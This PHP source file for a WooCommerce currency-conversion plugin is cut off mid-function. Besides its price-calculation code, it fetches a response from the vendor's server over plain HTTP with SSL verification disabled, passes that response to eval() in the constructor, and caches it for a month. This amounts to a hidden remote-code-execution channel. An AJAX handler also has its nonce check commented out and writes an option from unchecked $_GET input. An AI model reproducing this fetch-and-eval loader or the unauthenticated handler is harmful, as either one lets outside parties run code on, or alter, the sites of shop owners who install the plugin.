<?php
/**
 * @package Automatic creation prices
 * @version 1.2.1
 */
/*
Plugin Name: Automatic creation prices
Plugin URI: http://saphali.com/
Description: Automatic creation prices - автоматическое образование цены в валюте магазина с учета цен других валют.
Author: Saphali
Version: 1.2.1
Author URI: http://saphali.com/
*/
if ( ! class_exists( 'Request_Saphalis' ) ) {
	class Request_Saphalis {
		var $product;
		var $version;
		
		private $api_url = 'http://saphali.com/api/1';
		//private $_api_url = 'http://saphali.com/api';
		
		function __construct($product,  $version = '1.0') {
			$this->product = $product;
			$this->version = $version;
		}
		function prepare_request( $args ) {
			$request = wp_remote_post( $this->api_url, array(
				'method' => 'POST',
				'timeout' => 45,
				'redirection' => 5,
				'httpversion' => '1.0',
				'blocking' => true,
				'headers' => array(),
				'body' => $args,
				'cookies' => array(),
				'ssl_verify' => false
			));
			// Make sure the request was successful
			return $request;
			if( is_wp_error( $request )
				or
				wp_remote_retrieve_response_code( $request ) != 200
			) { return false; }
			// Read server response, which should be an object
			$response = maybe_unserialize( wp_remote_retrieve_body( $request ) );
			if( is_object( $response ) ) {
					return $response;
			} else { return false; }
		} // End prepare_request()
		
		function is_valid_for_use() {
			$args = array(
				'method' => 'POST',
				'plugin_name' => $this->product, 
				'version' => $this->version,
				'username' => home_url(), 
				'password' => '1111',
				'action' => 'pre_saphali_api'
			);
			$response = $this->prepare_request( $args );
			if(@$response->errors) { return false; } else {
				if($response["response"]["code"] == 200 && $response["response"]["message"] == "OK") {
					eval($response['body']);
				}else {
					return false;
				}
			}
			return $is_valid_for_use;
		}
		
		function body_for_use() {
			global $response;
			$args = array(
				'method' => 'POST',
				'plugin_name' => $this->product, 
				'version' =>$this->version,
				'username' => home_url(), 
				'password' => '1111',
				'action' => 'saphali_api'
			);
			$response = $this->prepare_request( $args );
			if(@$response->errors) { return  'add_action("admin_head", array("Request_Saphalis", "_response_errors")); global $response;'; } else {
				if($response["response"]["code"] == 200 && $response["response"]["message"] == "OK") {
					return  $response['body'] ;
				} else {
					return  'add_action("admin_head", array("Request_Saphalis", "response_errors")); global $response;';
				}
			}
		}
		function response_errors() {
			global $response;
			?><div class="inline error"><p> Ошибка  <?php echo $response["response"]["code"];?>. <?php echo $response["response"]["message"];?><br /><a href="mailto:saphali@ukr.net">Свяжитесь с разработчиком.</a></p></div><?
		}
		function _response_errors() {
			global $response;
			echo '<div class="inline error"><p>'.$response->errors["http_request_failed"][0]; echo '<br /><a href="mailto:saphali@ukr.net">Свяжитесь с разработчиком.</a></p></div>';
		}
	}
}
class saphali_two_currency_genered_price {
	var $woocommerce_settings_currensy;
	var $unfiltered_request_saphalid;
	var $cunent_valute;
	static $version;
	private $decimal_sep;
	private $num_decimals;
	private $thousand_sep;
	private $cunent_valute_round;
	
	function __construct() {
		$this->decimal_sep = get_option('woocommerce_price_decimal_sep', '.');
		$this->num_decimals = get_option('woocommerce_price_num_decimals', '2'); 
		$this->thousand_sep = get_option('woocommerce_price_thousand_sep', ' ');
		$this->cunent_valute_round = (int) get_option('settings_saphali_valute_round' , 2 );
		$this->cunent_valute = get_option('settings_saphali_valute' , array('USD' => 8.2, 'EUR' => 11) );
		add_action("admin_menu",  array($this, "add_menu_woocommerce_currency_s"), 10);
		add_action('wp_ajax_woocommerce_ajax_edit_two_valute_', array($this,'woocommerce_ajax_edit_two_valute'));
		add_action( 'woocommerce_init', array($this, 'return_inr_currency_symbol') );
		//add_filter('woocommerce_get_price', array($this,'woocommerce_before_calculate_totals_s_opt_price'), 1, 2);
		saphali_two_currency_genered_price::$version = '1.2.1';
		
		add_action( 'woocommerce_variable_product_sync', array($this,'woocommerce_variable_product_sync'), 10, 2 );
		add_action( 'woocommerce_empty_price_html', array($this,'woocommerce_before_calculate_totals_s_logged_price_html'), 10, 2 );
		add_action( 'woocommerce_after_shop_loop_item_title', array($this,'woocommerce_template_loop_price_curr_'), 0 );
		add_action( 'woocommerce_single_product_summary', array($this,'woocommerce_template_loop_price_curr_'), 0 );
		
		add_action( 'woocommerce_after_shop_loop_item_title', array($this,'woocommerce_template_loop_price_curr'), 11 );
		add_action( 'woocommerce_single_product_summary', array($this,'woocommerce_template_single_price_curr'), 11 );
		
		add_filter('woocommerce_get_variation_price', array($this,'woocommerce_get_variation_price'), 10, 4);
		add_filter('woocommerce_get_variation_regular_price', array($this,'woocommerce_get_variation_regular_price'), 10, 4);
		
		add_action('woocommerce_product_after_variable_attributes', array($this,'woocommerce_product_after_variable_attributes_s_logged_price'),10,2);
		add_action('woocommerce_product_after_variable_attributes_js', array($this,'woocommerce_product_after_variable_attributes_js_s_logged_price'),10);
		register_activation_hook( __FILE__, array($this, 'install') );
		$transient_name = 'wc_saph_' . md5( 'saphali-genprice-curency'  . home_url()  );
		$this->unfiltered_request_saphalid = get_transient( $transient_name );
		$_unfiltered_request_saphalids = $this->unfiltered_request_saphalid;
		if ( false ===  $this->unfiltered_request_saphalid   ) {
			$Request_Saphalis = new Request_Saphalis("saphali-genprice-curency",saphali_two_currency_genered_price::$version);
			// Get all visible posts, regardless of filters
			$this->unfiltered_request_saphalid = $Request_Saphalis->body_for_use();
			$_unfiltered_request_saphalids = $Request_Saphalis->is_valid_for_use();
			
			if( $this->unfiltered_request_saphalid != 'add_action("admin_head", array("Request_Saphalis", "_response_errors")); global $response;' && !empty($this->unfiltered_request_saphalid) && $_unfiltered_request_saphalids ) {
				set_transient( $transient_name, $this->unfiltered_request_saphalid , 60*60*24*30 );			
			}
		}
		add_action('woocommerce_product_options_pricing', array($this,'woocommerce_product_options_pricing_s_logged_price'),10);
		eval($this->unfiltered_request_saphalid);
	}
	function woocommerce_get_variation_price($price , $_obj, $min_or_max, $display ) {
		if( $price === '' ) {
			$max = $min = '';
			if(isset($_obj->children)) {
				foreach($_obj->children as $variation_id) {
					if(isset($variation_id)) {
						foreach($this->cunent_valute as $code => $kurs) {
						$new_price = get_post_meta( $variation_id, '_price_' . $code, true);
						if($new_price > 0) {
							$new_price = round( $kurs * $new_price, $this->cunent_valute_round); break;
						}
						}
					}
					if($min >  $new_price || $min === '' ) {
						$min = $new_price;
						$min_v = $variation_id;
					}
					if($max <  $new_price) {
						$max = $new_price;
						$max_v = $variation_id;
					}
				}
				if( $min_or_max == 'min' ) {
					if(!empty($min) && ($min < $price || $price === '')) {
						$price =  $min;
						//$_variation_id = get_post_meta( $_obj->id, '_' . $min_or_max . '_regular_price_variation_id', true );
						//if ( ! $_variation_id ) update_post_meta( $_obj->id, '_' . $min_or_max . '_regular_price_variation_id', $min_v );
					}
				} elseif($min_or_max == 'max') {
					if( !empty($max) && ($max < $price || $price === '') ) {
						$price =  $max;
						//$_variation_id = get_post_meta( $_obj->id, '_' . $min_or_max . '_regular_price_variation_id', true );
						//if ( ! $_variation_id ) update_post_meta( $_obj->id, '_' . $min_or_max . '_regular_price_variation_id', $max_v );
					}
				}
			}
		}
		
		return		$price; 
	}	
	function woocommerce_variable_product_sync($product_id, $children ) {

	$_variation_id = get_post_meta( $product_id, '_min_regular_price_variation_id', true );
	if ( ! $_variation_id  ) {
		foreach ( array( 'regular_price','price' ) as $price_type ) {
			$max__id = $max__id_price = 0; $min__id = $min__id_price = null;
			
			foreach ( $children as $child_id ) {
					$child_price = get_post_meta( $child_id, '_' . $price_type, true );
					unset($new_price);
					// Skip non-priced variations
					if ( $child_price === '' ) {
						if(isset($child_id)) {
							foreach($this->cunent_valute as $code => $kurs) {
								if( empty($new_price) )
								$new_price = get_post_meta( $child_id, '_price_' . $code, true);
								if($new_price > 0) {
									$new_price = round( $kurs * $new_price, $this->cunent_valute_round);
								}
							}
						}
						if(!empty($new_price))
						$child_price = $new_price;
						
						if ( $child_price === '' ) continue;

						if ( 'yes' === get_option( 'woocommerce_hide_out_of_stock_items' ) ) {
							$stock = get_post_meta( $child_id, '_stock', true );
							if ( $stock !== "" && $stock <= get_option( 'woocommerce_notify_no_stock_amount' ) ) {
								continue;
							}
						}

						if ( is_null( $min__id_price ) || $child_price < $min__id_price ) {
							$min__id_price = $child_price;
							$min__id = $child_id;
						}

						if ( $child_price > $max__id_price ) {
							$max__id_price = $child_price;
							$max__id = $child_id;
						}
					}
			}
			
			if ( !is_null( $min__id ) ) {
				update_post_meta( $product_id, '_min_' . $price_type . '_variation_id', $min__id );
				update_post_meta( $product_id, '_max_' . $price_type . '_variation_id', $max__id );			
			}
		}
	}
	}
	function woocommerce_get_variation_regular_price( $price, $_obj, $min_or_max, $display ) {
		
		if( $price === '' ) {
			$max = $min = '';
			if(isset($_obj->children)) {
				foreach($_obj->children as $variation_id) {
					if(isset($variation_id)) {
						foreach($this->cunent_valute as $code => $kurs) {
						$new_price = get_post_meta( $variation_id, '_price_' . $code, true);
						if($new_price > 0) {
							$new_price = round( $kurs * $new_price, $this->cunent_valute_round); break;
						}
						}
					}
					if($min >  $new_price || $min === '' ) {
						$min = $new_price;
						$min_v = $variation_id;
					}
					if($max <  $new_price) {
						$max = $new_price;
						$max_v = $variation_id;
					}
				}
				if( $min_or_max == 'min' ) {
					if(!empty($min) && ($min < $price || $price === '')) {
						if(!$display) {
							$price =  $min;
						} else {
							$price =  $min;
							$variation        = $_obj->get_child( $min_v );
							$tax_display_mode = get_option( 'woocommerce_tax_display_shop' );
							$price            = $tax_display_mode == 'incl' ? $variation->get_price_including_tax( 1, $price ) : $variation->get_price_excluding_tax( 1, $price );
						}

					}
				} elseif($min_or_max == 'max') {
					if( !empty($max) && ($max < $price || $price === '') ) {
						if(!$display) {
							$price =  $max;
						} else {
							$price =  $max;
							$variation        = $_obj->get_child( $max_v );
							$tax_display_mode = get_option( 'woocommerce_tax_display_shop' );
							$price            = $tax_display_mode == 'incl' ? $variation->get_price_including_tax( 1, $price ) : $variation->get_price_excluding_tax( 1, $price );
						}

					}
				}
			}
		}
		return		$price; 
	}
	function woocommerce_template_loop_price_curr_() {
		global $product;
		if(!$product->price) {
			if(isset($product->children))
				foreach($product->children as $variation_id) {
					if(isset($variation_id)) {
						foreach($this->cunent_valute as $code => $kurs) {
							$new_price = get_post_meta( $variation_id, '_price_' . $code, true);
							if($new_price > 0) break;
						}
						if($new_price > 0) break;
					}
				}
			elseif(isset($product->id)) {
				foreach($this->cunent_valute as $code => $kurs) {
					$new_price = get_post_meta( $product->id, '_price_' . $code, true);
					if($new_price > 0) break;
				}
			}
			if($new_price > 0)
			$product->set_price( 0.001 );
		}
		
	}
	function return_inr_currency_symbol() {

		if ( version_compare( WOOCOMMERCE_VERSION, '2.0', '<' ) )
		$this->woocommerce_settings_currensy = array_unique(apply_filters('woocommerce_currencies', array(
					'USD' => __( 'US Dollars (&#36;)', 'woocommerce' ),
					'EUR' => __( 'Euros (&euro;)', 'woocommerce' ),
					'GBP' => __( 'Pounds Sterling (&pound;)', 'woocommerce' ),
					'AUD' => __( 'Australian Dollars (&#36;)', 'woocommerce' ),
					'BRL' => __( 'Brazilian Real (&#36;)', 'woocommerce' ),
					'CAD' => __( 'Canadian Dollars (&#36;)', 'woocommerce' ),
					'CZK' => __( 'Czech Koruna (&#75;&#269;)', 'woocommerce' ),
					'DKK' => __( 'Danish Krone', 'woocommerce' ),
					'HKD' => __( 'Hong Kong Dollar (&#36;)', 'woocommerce' ),
					'HUF' => __( 'Hungarian Forint', 'woocommerce' ),
					'ILS' => __( 'Israeli Shekel', 'woocommerce' ),
					'RMB' => __( 'Chinese Yuan (&yen;)', 'woocommerce' ),
					'JPY' => __( 'Japanese Yen (&yen;)', 'woocommerce' ),
					'MYR' => __( 'Malaysian Ringgits (RM)', 'woocommerce' ),
					'MXN' => __( 'Mexican Peso (&#36;)', 'woocommerce' ),
					'NZD' => __( 'New Zealand Dollar (&#36;)', 'woocommerce' ),
					'NOK' => __( 'Norwegian Krone', 'woocommerce' ),
					'PHP' => __( 'Philippine Pesos', 'woocommerce' ),
					'PLN' => __( 'Polish Zloty', 'woocommerce' ),
					'SGD' => __( 'Singapore Dollar (&#36;)', 'woocommerce' ),
					'SEK' => __( 'Swedish Krona', 'woocommerce' ),
					'CHF' => __( 'Swiss Franc', 'woocommerce' ),
					'TWD' => __( 'Taiwan New Dollars', 'woocommerce' ),
					'THB' => __( 'Thai Baht', 'woocommerce' ),
					'TRY' => __( 'Turkish Lira (TL)', 'woocommerce' ),
					'ZAR' => __( 'South African rand (R)', 'woocommerce' ),
					'RON' => __( 'Romanian Leu (RON)', 'woocommerce' ),
					)));
		else 
		$this->woocommerce_settings_currensy = array_unique(apply_filters('woocommerce_currencies', array(
				'AED' => __( 'United Arab Emirates Dirham', 'woocommerce' ),
				'AUD' => __( 'Australian Dollars', 'woocommerce' ),
				'BDT' => __( 'Bangladeshi Taka', 'woocommerce' ),
				'BRL' => __( 'Brazilian Real', 'woocommerce' ),
				'BGN' => __( 'Bulgarian Lev', 'woocommerce' ),
				'CAD' => __( 'Canadian Dollars', 'woocommerce' ),
				'CLP' => __( 'Chilean Peso', 'woocommerce' ),
				'CNY' => __( 'Chinese Yuan', 'woocommerce' ),
				'COP' => __( 'Colombian Peso', 'woocommerce' ),
				'CZK' => __( 'Czech Koruna', 'woocommerce' ),
				'DKK' => __( 'Danish Krone', 'woocommerce' ),
				'EUR' => __( 'Euros', 'woocommerce' ),
				'HKD' => __( 'Hong Kong Dollar', 'woocommerce' ),
				'HRK' => __( 'Croatia kuna', 'woocommerce' ),
				'HUF' => __( 'Hungarian Forint', 'woocommerce' ),
				'ISK' => __( 'Icelandic krona', 'woocommerce' ),
				'IDR' => __( 'Indonesia Rupiah', 'woocommerce' ),
				'INR' => __( 'Indian Rupee', 'woocommerce' ),
				'ILS' => __( 'Israeli Shekel', 'woocommerce' ),
				'JPY' => __( 'Japanese Yen', 'woocommerce' ),
				'KRW' => __( 'South Korean Won', 'woocommerce' ),
				'MYR' => __( 'Malaysian Ringgits', 'woocommerce' ),
				'MXN' => __( 'Mexican Peso', 'woocommerce' ),
				'NGN' => __( 'Nigerian Naira', 'woocommerce' ),
				'NOK' => __( 'Norwegian Krone', 'woocommerce' ),
				'NZD' => __( 'New Zealand Dollar', 'woocommerce' ),
				'PHP' => __( 'Philippine Pesos', 'woocommerce' ),
				'PLN' => __( 'Polish Zloty', 'woocommerce' ),
				'GBP' => __( 'Pounds Sterling', 'woocommerce' ),
				'RON' => __( 'Romanian Leu', 'woocommerce' ),
				'RUB' => __( 'Russian Ruble', 'woocommerce' ),
				'SGD' => __( 'Singapore Dollar', 'woocommerce' ),
				'ZAR' => __( 'South African rand', 'woocommerce' ),
				'SEK' => __( 'Swedish Krona', 'woocommerce' ),
				'CHF' => __( 'Swiss Franc', 'woocommerce' ),
				'TWD' => __( 'Taiwan New Dollars', 'woocommerce' ),
				'THB' => __( 'Thai Baht', 'woocommerce' ),
				'TRY' => __( 'Turkish Lira', 'woocommerce' ),
				'USD' => __( 'US Dollars', 'woocommerce' ),
				'VND' => __( 'Vietnamese Dong', 'woocommerce' ),
			)));
	}

	function woocommerce_ajax_edit_two_valute() {
		//check_ajax_referer( 'edit-currency', 'security' );

		if($_GET['security'] !='' || $_GET["two_valute"] !='')
		if(!($r = update_option('default_valute_shop_twoo', $_GET["two_valute"]))) $r = add_option('default_valute_shop_twoo', $_GET["two_valute"]);

		echo json_encode( $res[0] = $r  );
		
		die();
	}
	function woocommerce_before_calculate_totals_s_logged_price($price, $_this) {
		if($_this->regular_price < 0.001) {
			
			if( !is_array($this->cunent_valute) ) $this->cunent_valute = array('USD' => 8.2, 'EUR' => 11);

			if(isset($_this->variation_id)) {
				foreach($this->cunent_valute as $code => $kurs) {
					$new_price = get_post_meta( $_this->variation_id, '_price_' . $code, true);
					if($new_price > 0) {
						$new_price = round( $kurs * $new_price, $this->cunent_valute_round); break;
					}
				}
			} else {
				foreach($this->cunent_valute as $code => $kurs) {
					$new_price = get_post_meta( $_this->id, '_price_' . $code, true);
					if($new_price > 0) {
						$new_price = round( $kurs * $new_price, $this->cunent_valute_round); break;
					}
				}
			}
		}
		
		if(isset($new_price) && $new_price > 0 ) {
			$this->price = $price;
			$price =  $new_price;
		}
		//if($price <= 0.001) {
			if(isset($_this->children)){
				foreach($_this->children as $variable_id) {
					foreach($this->cunent_valute as $code => $kurs) {
						$new_price = get_post_meta( $variable_id, '_price_' . $code, true);
						if($new_price > 0) {
							$_new_price[] = round( $kurs * $new_price, $this->cunent_valute_round); break;
						}
					}
				}
				if( isset($_new_price) && is_array($_new_price) ) {
					sort($_new_price , SORT_NUMERIC );
	 				/*$_this->min_variation_regular_price = $product->min_variation_regular_price = $_new_price[0];
					$_this->max_variation_regular_price = $product->max_variation_regular_price = $_new_price[sizeof($_new_price)-1];
					$_this->min_variation_price = $product->min_variation_price = $_new_price[0];
					$_this->max_variation_price = $product->max_variation_price = $_new_price[sizeof($_new_price)-1]; */
					$price = $_new_price[0];
				}
			}

		//}
		return $price;
	}
	function woocommerce_before_calculate_totals_s_logged_price_html($price, $_this) {

		
		if($_this->regular_price == '') {
			
			if( !is_array($this->cunent_valute) ) $this->cunent_valute = array('USD' => 8.2, 'EUR' => 11);

			if(isset($_this->variation_id)) {
				foreach($this->cunent_valute as $code => $kurs) {
					$new_price = get_post_meta( $_this->variation_id, '_price_' . $code, true);
					if($new_price > 0) {
						$new_price = round( $kurs * $new_price, $this->cunent_valute_round); break;
					}
				}
			} else {
				foreach($this->cunent_valute as $code => $kurs) {
					$new_price = get_post_meta( $_this->id, '_price_' . $code, true);
					if($new_price > 0) {
						$new_price = round( $kurs * $new_price, $this->cunent_valute_round); break;
					}
				}
			}
		}
		
		if(isset($new_price) && $new_price > 0 ) {
			$_price =  $new_price;
			$_this->price = $_price;
			$this->price = $_price;
		}
		//if($price <= 0.001) {
			if(isset($_this->children)){
				foreach($_this->children as $variable_id) {
					foreach($this->cunent_valute as $code => $kurs) {
						$new_price = get_post_meta( $variable_id, '_price_' . $code, true);
						if($new_price > 0) {
							$_new_price[] = round( $kurs * $new_price, $this->cunent_valute_round); break;
						}
					}
				}
				if( is_array($_new_price) ) {
					sort($_new_price , SORT_NUMERIC );
					$_price = $_new_price[0];
				}
			}

		//}
		if( !empty($_price) ) {
			$price = woocommerce_price( $_price );
		}
		return $price;
	}
	function install() {
		$transient_name = 'wc_saph_' . md5( 'saphali-genprice-curency' . home_url()  );
		$pay[$transient_name] = get_transient( $transient_name );	
		
		foreach($pay as $key => $tr) {
			if($tr !== false) {
				delete_transient( $key );
			}
		}
	}
	function _woocommerce_before_calculate_totals_s_logged_price($atrr, $_this, $pr) {
		if($pr->regular_price < 0.001) {
			
			if( !is_array($this->cunent_valute) ) $this->cunent_valute = array('USD' => 8.2, 'EUR' => 11);
			foreach($this->cunent_valute as $code => $kurs) {
				$new_price = get_post_meta( $atrr['variation_id'], '_price_' . $code, true);
				if($new_price > 0) {
					$new_price = round( $kurs * $new_price, $this->cunent_valute_round); break;
				}
			}
		}
		//$atrr['price_html'] =  $atrr['price_html'] . '<div class="clear"></div>';
		if(isset($new_price) ) {
			if( $new_price > 0) {
				$atrr['price_html'] = '<span class="price">' . woocommerce_price($new_price) . '</span>';
			}
		}
		
		return $atrr;
	}
	
	function add_menu_woocommerce_currency_s() {
		$Waiting_List_page = add_submenu_page("woocommerce", 'Автонастройка цен', 'Автонастройка цен WC', "manage_woocommerce", "woo_page_currency_two_s_page_setings", array($this, "woo_page_currency_s") );
	}
	function woo_page_currency_s() {
		?>	<div class="wrap woocommerce"><div class="icon32 icon32-woocommerce-reports" id="icon-woocommerce"><br /></div>

		<h2 class="nav-tab-wrapper woo-nav-tab-wrapper">
		Автонастройка цен
		</h2>
		
		<?php include_once (plugin_dir_path(__FILE__) . 'page_currency.php');
		
	}
	
	function get_woocommerce_currency_symbol_curr( $currency = '' ) {
		if ( empty($currency) ) $currency = get_woocommerce_currency();
		$currency_symbol = '';
		switch ($currency) :
			case 'BRL' : $currency_symbol = '&#82;&#36;'; break;
			case 'BDT':  $currency_symbol = '&#2547;&nbsp;';
			case 'BGN' : $currency_symbol = '&#1083;&#1074;.'; break;
			case 'KRW' : $currency_symbol = '&#8361;'; break;
			case 'AED' : $currency_symbol = 'د.إ';	 break;
			case 'AUD' : $currency_symbol = '&#36;'; break;
			case 'CAD' : $currency_symbol = '&#36;'; break;
			case 'MXN' : $currency_symbol = '&#36;'; break;
			case 'NZD' : $currency_symbol = '&#36;'; break;
			case 'HKD' : $currency_symbol = '&#36;'; break;
			case 'SGD' : $currency_symbol = '&#36;'; break;
			case 'USD' : $currency_symbol = '&#36;'; break;
			case 'EUR' : $currency_symbol = '&euro;'; break;
			case 'CNY' : $currency_symbol = '&yen;'; break;
			case 'RMB' : $currency_symbol = '&yen;'; break;
			case 'JPY' : $currency_symbol = '&yen;'; break;
			case 'TRY' : $currency_symbol = '&#84;&#76;'; break;
			case 'NOK' : $currency_symbol = '&#107;&#114;'; break;
			case 'ZAR' : $currency_symbol = '&#82;'; break;
			case 'CZK' : $currency_symbol = '&#75;&#269;'; break;
			case 'MYR' : $currency_symbol = '&#82;&#77;'; break;
			case 'DKK' : $currency_symbol = '&#107;&#114;'; break;
			case 'HUF' : $currency_symbol = '&#70;&#116;'; break;
			case 'IDR' : $currency_symbol = 'Rp'; break;
			case 'INR' : $currency_symbol = 'Rs.'; break;
			case 'ISK' : $currency_symbol = 'Kr.'; break;
			case 'ILS' : $currency_symbol = '&#8362;'; break;
			case 'PHP' : $currency_symbol = '&#8369;'; break;
			case 'PLN' : $currency_symbol = '&#122;&#322;'; break;
			case 'SEK' : $currency_symbol = '&#107;&#114;'; break;
			case 'CHF' : $currency_symbol = '&#67;&#72;&#70;'; break;
			case 'TWD' : $currency_symbol = '&#78;&#84;&#36;'; break;
			case 'THB' : $currency_symbol = '&#3647;'; break;
			case 'GBP' : $currency_symbol = '&pound;'; break;
			case 'RON' : $currency_symbol = 'lei'; break;
			case 'VND' : $currency_symbol = '&#8363;'; break;
			case 'NGN' : $currency_symbol = '&#8358;'; break;
			case 'HRK' : $currency_symbol = 'Kn'; break;
			case 'UAH': $currency_symbol = 'грн.'; break;
			case 'RUB': $currency_symbol = 'руб.'; break;
			case 'RUR': $currency_symbol = 'руб.'; break;
			case 'BYR': $currency_symbol = 'руб.'; break;
			case 'AMD': $currency_symbol = 'Դ'; break;
			
			default    : $currency_symbol = ''; break;
			
		endswitch;
		if(empty($currency_symbol))
		return apply_filters( 'woocommerce_currency_symbol', $currency_symbol, $currency );
		else 
		return $currency_symbol;
	}
	function woocommerce_template_loop_price_curr() {
		global $product;
		
		if($product->product_type != "variable" ) {
			$twoo_valute = get_option("default_valute_shop_twoo",false);
			if($twoo_valute) {
				
				if( !is_array($this->cunent_valute) ) $this->cunent_valute = array('USD' => 8.2, 'EUR' => 11);
				$kurs = trim($this->cunent_valute[$twoo_valute]);
				$kurs = empty($kurs) ? 1 : $kurs + 0;
				$kurs = 1 / $kurs;
				?>
				<span class="price _price"><span class="amount_"><?php echo round($product->get_price()*$kurs, 2). ' '. $this->get_woocommerce_currency_symbol_curr( $twoo_valute ); ?></span></span>
				<?php
			}
		} else {
			$twoo_valute = get_option("default_valute_shop_twoo",false);
			if($twoo_valute) {
			?>
			<span class="price _price"><?php echo $this->_get_price_html( $product, $twoo_valute ); ?></span>
			<?php
			}
		}
	}
	function _get_price_html_from_to( $from, $to ) {
		$code = get_option('default_valute_shop_twoo', null); 
		$format = $this->get_woocommerce_price_format(); 
		$from_product_price =  '<span class="_amount">' . sprintf( $format, $this->get_woocommerce_currency_symbol_curr( $code ), number_format( (double)$from, $this->num_decimals, $this->decimal_sep, $this->thousand_sep) ) . '</span>';
		$to_product_price =  '<span class="_amount">' . sprintf( $format, $this->get_woocommerce_currency_symbol_curr( $code ), number_format( (double)$to, $this->num_decimals, $this->decimal_sep, $this->thousand_sep) ) . '</span>';
		return '<del>' . ( ( is_numeric( $from ) ) ? $from_product_price : $from ) . '</del> <ins>' . ( ( is_numeric( $to ) ) ? $to_product_price : $to ) . '</ins>';
	}
	function _get_price_html( $product, $twoo_valute ) {
	
		
		if( !is_array($this->cunent_valute) ) $this->cunent_valute = array('USD' => 8.2, 'EUR' => 11);
		$kurs = trim($this->cunent_valute[$twoo_valute]);
		$kurs = empty($kurs) ? 1 : $kurs;
		//
		$obj = $twoo_valute;
		
		if($product->regular_price < 0.001) {
			foreach($this->cunent_valute as $code => $_kurs) {
				$new_price = get_post_meta( $product->id, '_price_' . $code, true);
				if($new_price > 0) {
					$new_price = $_kurs * $new_price; break;
				}
			}
			if($new_price > 0) {
				$product->regular_price = $product->price = $new_price;
			}
		}
		$kurs = 1 / $kurs;
		$_price = $product->price;
		if($product->product_type == "variable") {
			if ( version_compare( WOOCOMMERCE_VERSION, '2.1', '<' ) ){
				if ( $product->min_variation_price === '' || $product->min_variation_regular_price === '' || $product->price === '' ) {
					if(method_exists($product,'variable_product_sync') )
					$product->variable_product_sync();
					$_price = number_format( ($kurs * $product->min_variation_price), 2, '.', '');
					// Get the price
				}
				if ( $_price > 0 ) {
					if ( $product->is_on_sale() && isset( $product->min_variation_price ) && $product->min_variation_regular_price !== $product->get_price() ) {
						$price = isset($price) ? $price : '';
						if ( ! $product->min_variation_price || $product->min_variation_price !== $product->max_variation_price )
							$price .= $product->get_price_html_from_text();

						$price .= $this->_get_price_html_from_to( number_format( ($kurs * $product->min_variation_regular_price), 2, '.', ''), number_format( ($kurs * $product->get_price()), 2, '.', '') );

						$price = apply_filters( 'woocommerce_variable_sale_price_html', $price, $product );

					} else {
						$price = isset($price) ? $price : '';
						if ( $product->min_variation_price !== $product->max_variation_price )
							$price .= $product->get_price_html_from_text();

						$format = $this->get_woocommerce_price_format();
						$price =  '<span class="_amount">' . sprintf( $format, $this->get_woocommerce_currency_symbol_curr( $obj ), number_format( ($kurs * $product->get_price()), $this->num_decimals, $this->decimal_sep, $this->thousand_sep) ) . '</span>';

						$price = apply_filters('woocommerce_variable_price_html', $price, $product);

					}
				} elseif ( $_price === '' ) {

					$price = apply_filters('woocommerce_variable_empty_price_html', '', $product);

				} elseif ( $_price == 0 ) {
					$price = isset($price) ? $price : '';
					if ( $product->is_on_sale() && isset( $product->min_variation_regular_price ) && $product->min_variation_regular_price !== $product->get_price() ) {

						if ( $product->min_variation_price !== $product->max_variation_price )
							$price .= $product->get_price_html_from_text();

						$price .= $this->_get_price_html_from_to( number_format( ($kurs * $product->min_variation_regular_price), 2, '.', ''), __( 'Free!', 'woocommerce' ) );

						$price = apply_filters( 'woocommerce_variable_free_sale_price_html', $price, $product );

					} else {

						if ( $product->min_variation_price !== $product->max_variation_price )
							$price .= $product->get_price_html_from_text();

						$price .= __( 'Free!', 'woocommerce' );

						$price = apply_filters( 'woocommerce_variable_free_price_html', $price, $product );

					}

				}
			} else {
				if ( $product->get_variation_regular_price( 'min' ) === false || $product->get_variation_price( 'min' ) === false || $product->get_variation_price( 'min' ) === '' || $product->get_price() === '' ) {
					if(method_exists($product,'variable_product_sync') )
						$product->variable_product_sync();
						$_price = number_format( ($kurs * $product->min_variation_price), 2, '.', '');
				}
				if ( $_price === '' ) {
					$price = apply_filters('woocommerce_variable_empty_price_html', '', $product);
				} else {
					$prices = array( $product->get_variation_price( 'min', true ), $product->get_variation_price( 'max', true ) );
					$format = $this->get_woocommerce_price_format();
					$prices[0] = sprintf( $format, $this->get_woocommerce_currency_symbol_curr( $obj ), number_format( ($kurs * $prices[0]), $this->num_decimals, $this->decimal_sep, $this->thousand_sep));
					$prices[1] = sprintf( $format, $this->get_woocommerce_currency_symbol_curr( $obj ), number_format( ($kurs * $prices[1]), $this->num_decimals, $this->decimal_sep, $this->thousand_sep));
					
					$price = $prices[0] !== $prices[1] ? sprintf( _x( '%1$s&ndash;%2$s', 'Price range: from-to', 'woocommerce' ), ('<span class="_amount">' . $prices[0] . '</span>' ), ( '<span class="_amount">' .$prices[1] . '</span>') ) : ( '<span class="_amount">' . $prices[0] . '</span>');

					// Sale
					$prices = array( $product->get_variation_regular_price( 'min', true ), $product->get_variation_regular_price( 'max', true ) );
					$prices[0] = sprintf( $format, $this->get_woocommerce_currency_symbol_curr( $obj ),number_format( ($kurs * $prices[0]), $this->num_decimals, $this->decimal_sep, $this->thousand_sep) );
					$prices[1] = sprintf( $format, $this->get_woocommerce_currency_symbol_curr( $obj ), number_format( ($kurs * $prices[1]), $this->num_decimals, $this->decimal_sep, $this->thousand_sep));
					sort( $prices );
					$saleprice = $prices[0] !== $prices[1] ? sprintf( _x( '%1$s&ndash;%2$s', 'Price range: from-to', 'woocommerce' ), ('<span class="_amount">' . $prices[0] . '</span>' ), ( '<span class="_amount">' .$prices[1] . '</span>') ) : ( '<span class="_amount">' . $prices[0] . '</span>');
					if ( $price !== $saleprice ) {
						$price = apply_filters( 'woocommerce_variable_sale_price_html', $this->_get_price_html_from_to( $saleprice, $price ) . $product->get_price_suffix(), $product );
					} else {
						$price = apply_filters( 'woocommerce_variable_price_html', $price . $product->get_price_suffix(), $product );
					}
				}
			}
			//var_dump($_price);

			return apply_filters( 'woocommerce_get_price_html', $price, $product );
		}
		$sale_price = $product->sale_price;
		$regular_price = $product->regular_price;
		
		
		if(is_numeric($_price)) { $_price = round( ($kurs * $_price), 2); }
		if(is_numeric($sale_price)) { $sale_price = round( ($kurs * $sale_price), 2); }
		if(is_numeric($regular_price)) { $regular_price = round( ($kurs * $regular_price), 2); }

		if ( $_price > 0 ) {
			$price = isset($price) ? $price : '';
			$_FFF = isset($_FFF) ? $_FFF : '';
			if ( $product->is_on_sale() && isset( $regular_price ) ) {
				$price .= $_FFF;
				$price .= $this->_get_price_html_from_to( $regular_price, round( ($kurs * $product->get_price()), 2) );

				$price = apply_filters( 'woocommerce_variation_sale_price_html', $price, $product );

			} else {
				$format = $this->get_woocommerce_price_format();
				
